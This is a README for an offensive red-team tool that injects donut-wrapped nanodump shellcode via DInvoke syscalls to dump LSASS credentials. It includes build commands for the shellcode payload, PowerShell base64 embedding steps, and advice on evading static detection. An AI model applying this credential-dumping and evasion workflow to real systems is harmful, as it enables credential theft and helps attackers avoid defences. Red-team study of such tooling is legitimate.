# sNanoDumpInject 

Minor syscall edit to [@s3cur3th1ssh1t](https://twitter.com/ShitSecure)'s [NanoDumpInject.cs](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs) from this [blog post](https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/).  

This repo contains code with donut'ed nanodump. DO NOT RUN random shellcodes inside random 0-star github repos. 

## Credits 

All credits to:
- @s3cur3th1ssh1t, @S4ntiagoP, @rastamouse, @ccob, 
- https://offensivedefence.co.uk/posts/Dynamic-syscalls/ 
- https://github.com/CCob/SharpBlock/blob/master/Program.cs#L37

Original Blog post & code: https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/

## Edits 

Added syscalls for the `Inject()` function. Small project to practice syscalls using DInvoke and creating a small syscall-only DInvoke.

## MISC/TODOs 

- Static Detection for DInvoke usually occurs in DInvoke strings. Use projects like [InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak) to reduce hits (13 -> 3)

- Learn what this PatchExit function is, and replace with syscalls as well? 


Things for myself 
```
// use "x64 Native Tools for VS" for nmake for donut and nanodump 

# Create donut'ed nanodump - change parameters 
./donut.exe -i nanodump\dist\nanodump.x64.exe -b=1 -t -p "--valid --write C:\windows\temp\trash.evtx" -o <somewhere>\nanodump.bin

# Copy/paste the nanodump base64 to here, and compile. 
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<somewhere>nanodump.bin")) | clip

# Copy/paste the base64'ed dll and yeet it into the Invoke-sNanoDump.ps1 
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<somewhere>\sNanoDumpInject.dll")) | clip
```